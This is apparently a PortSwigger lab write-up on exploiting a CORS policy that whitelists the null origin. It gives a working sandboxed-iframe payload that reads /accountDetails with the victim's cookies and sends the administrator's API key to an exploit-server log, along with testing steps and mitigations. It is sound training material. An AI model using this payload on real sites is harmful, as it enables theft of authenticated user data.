# 📘 PortSwigger Lab: CORS vulnerability with trusted null origin

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-null-origin-whitelisted
> 🎯 Topic: Cross-Origin Resource Sharing (CORS) — Trusted null origin
> 🧪 Difficulty: Apprentice
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 The Vulnerable Headers](#headers)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Locate the Target Endpoint](#step1)
- [🔍 Step 2 — Test Null Origin Reflection](#step2)
- [🔍 Step 3 — Construct the Sandboxed Exploit](#step3)
- [🔍 Step 4 — Deliver Exploit to Victim](#step4)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a misconfigured CORS policy that incorrectly trusts the `null` origin to:

```text
1. Force the victim's browser to generate a cross-origin request with a `null` Origin header.
2. Bypass the server's whitelist by utilizing an HTML5 iframe sandbox.
3. Access the restricted endpoint (`/accountDetails`) using the victim's session cookies.
4. Exfiltrate the administrator's API key to the exploit server.
```

<a id="theory"></a>

## 🧠 Short Theory
When developers implement CORS whitelists to prevent arbitrary domains from accessing sensitive data, they sometimes include the `null` origin. This is usually a mistake made to support local development or testing (e.g., opening an HTML file directly from the filesystem using the `file:///` protocol, which generates a `null` origin).

Attackers can exploit this by forcing the victim's browser to send a request from a `null` origin. This cannot be done by simply overriding the `Origin` header in JavaScript (the browser blocks this). Instead, attackers use a sandboxed `iframe`. If an iframe is sandboxed without the `allow-same-origin` attribute, the browser treats its content as being from an opaque (null) origin.

<a id="idea"></a>

## 🧩 Core Idea
The target server validates the `Origin` header against a whitelist but erroneously includes `null` in that list, and allows credentials. 

```text
Attacker site:      Loads an iframe with a restrictive sandbox (no allow-same-origin).
Sandboxed iframe:   Executes an AJAX request to the target API.
Victim's browser:   Sets the request Origin to `null` due to sandbox isolation, and attaches cookies.
Target server:      Sees `Origin: null`, matches it to the whitelist, and reflects it in ACAO.
Sandboxed iframe:   Reads the response and exfiltrates it ✅
```

<a id="headers"></a>

## 📡 The Vulnerable Headers
When testing the endpoint with `Origin: null` in Burp Repeater, the server responds with:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
This confirms that the server explicitly permits cross-origin requests from `null` while accepting session cookies.

<a id="exploit"></a>

## ⚡ The Exploit Payload
The attacker uses an `iframe` with the `sandbox` attribute and `srcdoc` to embed the malicious JavaScript. 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    // AJAX payload with req.withCredentials = true
</script>"></iframe>
```
Because `allow-same-origin` is omitted, the browser isolates the frame and enforces a `null` origin for outbound AJAX requests.

<a id="step1"></a>

## 🔍 Step 1 — Locate the Target Endpoint
Log in as the test user.
Navigate to the account page and identify the AJAX request to `GET /accountDetails`.

<a id="step2"></a>

## 🔍 Step 2 — Test Null Origin Reflection
Send the `/accountDetails` request to Burp Repeater.
Modify the origin header: `Origin: null`.
Observe the response. The presence of `Access-Control-Allow-Origin: null` confirms the vulnerability.

<a id="step3"></a>

## 🔍 Step 3 — Construct the Sandboxed Exploit
Open the Exploit Server.
Wrap the standard `XMLHttpRequest` CORS payload inside a sandboxed iframe.
Ensure the JS safely encodes the response (`encodeURIComponent(this.responseText)`) before appending it to the exfiltration URL.

<a id="step4"></a>

## 🔍 Step 4 — Deliver Exploit to Victim
Save the exploit and deliver it to the victim.
Check the Access Log on the exploit server to retrieve the administrator's API key from the URL query string.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

<a id="response"></a>

## 📥 Example Result
Extracted Log Entry (Access Log)
```text
10.0.0.1 - - [Date] "GET /log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22apikey%22%3A%20%22O81FFF4CHUVPdVZIHXki5cweT9ZAS0zN%22... HTTP/1.1" 200
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify sensitive data retrieval endpoint (`/accountDetails`).
2. Test the endpoint in Repeater by sending `Origin: null`.
3. Confirm the server returns `ACAO: null` and allows credentials.
4. Construct an iframe payload using `sandbox="allow-scripts allow-top-navigation allow-forms"`.
5. Embed the XHR payload within the iframe's `srcdoc`.
6. Ensure URL encoding for data exfiltration (`encodeURIComponent`).
7. Deliver payload to victim, forcing their browser to send the `null` origin request.
8. Retrieve the stolen API key from the server logs.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Whitelisting `null`
The developer mistakenly included `null` in the CORS whitelist, likely leaving behind a configuration used for local testing.

2. HTML5 Sandbox Behavior
The attacker successfully abused the HTML5 iframe sandbox feature to force the victim's modern browser to deliberately act as an opaque (`null`) origin, perfectly aligning with the server's flawed whitelist.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When evaluating CORS configurations:

```text
If a server blocks arbitrary domains (e.g., `evil.com`), do not assume it is secure. Always test edge cases like `Origin: null`. 
If `null` is allowed with credentials, the protection is completely bypassed using an iframe sandbox.
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Adding `allow-same-origin` to the sandbox
If you write `sandbox="allow-scripts allow-same-origin"`, the browser will use the Exploit Server's actual domain as the Origin, and the attack will fail because the target server only whitelisted `null`.

Mistake 2. Forgetting URL Encoding
JSON contains characters like `{`, `"`, and spaces. Without `encodeURIComponent`, the browser may truncate or malform the URL when attempting to redirect, resulting in incomplete data in the access logs.

<a id="defense"></a>

## 🛡 Mitigation
1. Never Trust `null`
Never include `null` in a CORS `Access-Control-Allow-Origin` whitelist.

2. Proper Development Workflows
Use local web servers (e.g., `localhost`) for development and testing instead of relying on the `file:///` protocol.

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Sent request to `/accountDetails`
- [ ] Confirmed server reflects `Origin: null` in Repeater
Payload Generation
- [ ] Created `iframe` with `sandbox` (excluding `allow-same-origin`)
- [ ] Injected XHR script into `srcdoc`
- [ ] Used `encodeURIComponent` for exfiltration
Execution & Verification
- [ ] Delivered exploit to victim
- [ ] Extracted API key from Access Log
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated that whitelisting the `null` origin is just as dangerous as reflecting arbitrary origins:

```text
1. Proved that modern browser features (iframe sandbox) can be weaponized to generate opaque origins.
2. Successfully bypassed a CORS whitelist to steal authenticated data.
```
[⬆ Back to top](#top)
